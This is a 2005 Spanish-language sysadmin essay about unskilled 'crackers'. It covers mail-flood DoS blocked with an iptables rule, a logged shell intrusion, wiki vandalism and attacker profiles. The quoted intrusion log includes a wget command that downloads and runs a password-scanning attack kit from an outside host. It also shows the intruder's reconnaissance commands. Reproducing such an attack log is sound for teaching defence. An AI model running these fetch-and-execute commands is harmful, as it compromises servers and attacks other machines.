{Título: Crackers que creen ser hackers, descubriendo y aprendiendo}
{Autor: Igor Támara}
{Organización: FECTP}
{Dirección: [mailto:igor@tamarapatino.org igor@tamarapatino.org] }
{Versión: 0.1}
{Fecha: 5 de Junio de 2005}
{Idioma: es}

{Resumen: Este documento muestra como algunos crackers atacan y como \
sus ataques pueden ser prevenidos, o simplemente resultan infructuosos \
probablemente la mayoría de "ataques" son simplemente intentos por \
aprender, en otros casos, hay personas que consideran que a través de \
la red se puede llegar a hacer terrorismo.  Y por supuesto que se le \
puede hacer gastar valioso tiempo a ciertas personas.  Espero que este \
escrito no sea una pérdida de tiempo y que sirva para que hagamos de \
la red, un espacio más cómodo para construir.  Para entender más exte \
texto, por favor consulte \
http://igor.tamarapatino.org/escritos/hackersycrackers}

{Copyright: puede redistribuir esta información sin problema, en caso \
de que quiera hacer modificaciones o republicarla, por favor contacte \
al autor para poder llevar un registro.}

= Ejemplos de ataques de crackers =

A continuación algunos ejemplos de crackers que han tratado de 
introducir información o romper esquemas de seguridad.  Todos estos,
casos de la vida real.

== D.O.S. por envío masivo de correo ==

El correo electrónico es especialmente vulnerable a ataques de este 
estilo, aunque con filtros de spam, se puede hacer que la máquina 
descarte los mensajes.  Por ejemplo, un atacante puede tratar de 
enviar unos 200 mensajes en un segundo a una máquina a intervalos
de 5 minutos.

Esto se puede volver un inconveniente si se envía a una lista de correo
moderada, porque al moderador le comenzarán a llegar miles de mensajes 
en poco tiempo y se puede ocupar espacio en disco de forma innecesaria
por las copias que quedan en la base de datos de los manejadores de
listas de correo.

Particularmente se puede determinar la IP desde la cuál están enviando
los correos electrónicos por un script, o un programa específico o 
porque la máquina tiene relay abierto para que cualquiera haga uso de
ella para este tipo de acciones.  Es usual que se envíen mensajes falsos
con identidades falsas y que las empresas ISP colombianas no tengan en 
la línea de soporte personas que puedan reconvenir a sus usuarios, los
cuales son sus clientes, y "el cliente siempre tiene la razón", a pesar
de que esté sembrando anarquía.

Se puede cortar de raíz y evitar el procesamiento al filtro de spam o 
que se tenga que crear reglas al nivel de aplicación, interceptando los
mensajes desde una capa inferior del modelo OSI, por ejemplo :
 iptables -A INPUT -i eth1 -p TCP --dport 25 -s 200.75.79.172 -j REJECT

Esta regla se usaría en iptables e indicaría que a la tarjeta de red
eth1 le haga retornar mensajes de error al puerto de correo al computador
con IP pública 200.75.79.172.

Esto acabaría con la intromisión molesta y evitaría que el SMTP en 
conjunción con el filtro de spam o un antivirus empleen tiempo de 
procesador en las máquinas que procesan correo.

Por supuesto, esto es insuficiente cuando el ataque es descentralizado,
pero un cracker promedio no haría algo tan sofisticado.

== Entradas a máquinas a través de shells ==

Revisar continuamente las entradas desde sitios del exterior es algo
ineludible, sobre todo si se tiene máquinas con acceso ssh, un
administrador de red nunca permitirá que en sus máquinas haya sesiones
rsh o telnet que no estén sobre un canal seguro.

Es indispensable revisar que las conexiones sean desde sitios desde
donde se espera estén entrando las personas que tienen cuenta.  Aquí
el administrador no tiene mucho control sobre la forma en la cual los
usuarios elijen claves, y no hay certeza de que alguien no pueda
descubrir por prueba y error la clave de un usuario poco cuidadoso.

Otra cuestión importante es habilitar shells que tengan restringidos
los servicios, un ejemplo es '''rbash'''.

A continuación el log de un cracker en acción :

Comienza con una revisión de programas instalados para ver si puede
lanzar un ataque :

    1  w
No sabe la diferencia entre ruta absoluta y relativa
    2  cat etc/issue
    3  uname -a
    4  wget
    5  ls
    6  cd /tmp
En este caso no tenía permiso para cambiar de directorio
    7  ls
    8  cd 
No está muy seguro cómo se hace para cambiar una clave
    9  passswd
   10  passwd
   11  w
   12  php -v
   13  cd /var/tmp
   14  w
   15  cd /var/tmp
A pesar de que la máquina no permitía cambio de directorios lo intentó
varias veces, al parecer, no sabe qué significa los mensajes que el
computador le ofrece.
   16  ls
Seguramente copió y pego esto de algún sitio, porque le contaron que
con un script kiddie como estos era posible tomar el control de la
máquina para lanzar un ataque a otras máquinas.
   17  wget display.home.ro/trapper.tar.gz;tar zxvf trapper.tar.gz;rm
    -rf trapper.tar.gz;cd list;rm -rf pass_file;wget
    display.home.ro/pass_file;echo Gata Mai Adi87 am instalat ... acum
    dai cu ./a ip.ip Hai success ca nu te mai tin cu vba
   18  ./a 201.246
Ejecuta el binario a
   19  ls
   20  uname -a
   21  cat /etc/hosts
   22  cat /etc/vhosts

Finalmente el cracker sale de la máquina, creyendo que no ha sido
descubierto, para su sorpresa, la próxima vez que ingresa(2 días
después) se encuentra con que .bashrc contiene lo siguiente :
 echo "
 Dear cracker, want to learn ?"
 echo Use your time productively, look at :
 echo http://tuxedo.org/~esr/faqs/hacker-howto.html
 echo So you can become a real hacker.
 echo "Want to Join?

 "
 exit

Un mensaje para el cracker que no le permite ingresar a la máquina, y
le muestra cierta información para animarlo a volverse un hacker ;)

Lo interesante es que del cracker se determinó las IPs desde las
cuáles entró y se envió un correo electrónico a los administradores de
las máquinas acerca del posible compromiso de seguridad que pueden
tener en las mismas.

== Edición malintencionada de wikis ==

Los wikis son una de las mejores herramientas para construir 
documentación colaborativa en red, y la idea de los mismos, es 
facilitar la creación de contenidos sin castigar a los que quieren 
colaborar, por eso generalmente se usan sin ninguna autenticación,
esperando que la depuración de la información sea hecha por las
personas que lo visitan regularmente, es un proceso evolutivo de 
la documentación, terminan siendo páginas vivas, que diariamente
crecen y mejoran, los contenidos viven su selección natural.

= Perfil de los atacantes =

No todos los atacantes son iguales, y generalmente los crackers
son personas que encuentran información de coctel en Internet y 
tratan de aplicarla sin realmente mucho conocimiento, unos son
educables y otros no.    Un cracker puede convertirse en una persona
si acude a los sitios correctos, de otra forma, terminará solamente
en un sitio.

== Perfil número 1 ==

La curiosidad natural de los adolescentes les hace ir por sitios 
en los cuáles creen que encontrarán respuestas rápidas y fáciles a
cualquier circunstancia, por ejemplo, descubrir claves de otras
personas, cambiarles las cosas, en general, jugar y llamar la
atención de los demás.  Aunque por otra parte, saben que sus
pilatunas no son del todo correctas, pero la curiosidad los vence
y terminan entrando a sitios donde pueden aprender cosas. Ellos
posiblemente se regeneran después de algunos intentos y terminan
enseñando a otros cosas maravillosas que han aprendido.

En su proceso terminan aliándose hacia las personas que saben que
con esfuerzo continuo y con tablas de valores que redundan en sana
convivencia, podrán tener una buena vida.

== Perfil número 2 ==

Son los que lastimosamente no tuvieron una educación basada en
valores reales y hacen sus ataques pagos por otras personas, no
entienden el valor del trabajo de los demás y a pesar de que saben
que están haciendo cosas que ellos no desearían les hicieran, 
insisten en hacerlas.  Ejemplo de estas personas son los que se
prestan a hacer envío de UCE o SPAM.

Gracias a estos personajes, gran parte del procesamiento de los
sistemas de correo se centran en filtrar virus y spam, es una lástima
que el poder de cómputo de los equipos actuales no se pueda dedicar
a algo más interesante que estas labores y que los administradores
de red se vuelvan cada vez más costosos por tener que estar luchando
para defender a sus usuarios de estos personajes.

== El resto ==

Personas que no encuentran un lugar en el mundo y que definitivamente
desean llamar la atención o hacer quedar mal a otros, que finalmente 
no dan la cara cuando llevan a cabo sus acciones, por ejemplo, que
envían correos anónimos, que envían correos a nombre de otras personas
o que editan wikis de forma malintencionada y evitando ser descubiertos,
no saben que SI es posible determinar quiénes son, y que se podrían
llevar a cabo acciones legales.

= Preguntas frecuentes =

== De atacantes ==

== De administradores ==

= Lo que viene =

== Cuestiones legales ==

= Explicando términos técnicos =

;D.O.S.: Esto significa Denial Of Service, quiere decir que un servicio \
está fuera de línea.  En la vida real, cuando un banco se sobresatura de \
clientes comienzan esas filas interminables, y simplemente no se puede \
atender a los requerimientos de los clientes.

= Acerca de =

Este documento fue construido con experiencias propias del autor, y
usted es bienvenido a hacer adiciones y mejoras al mimso.
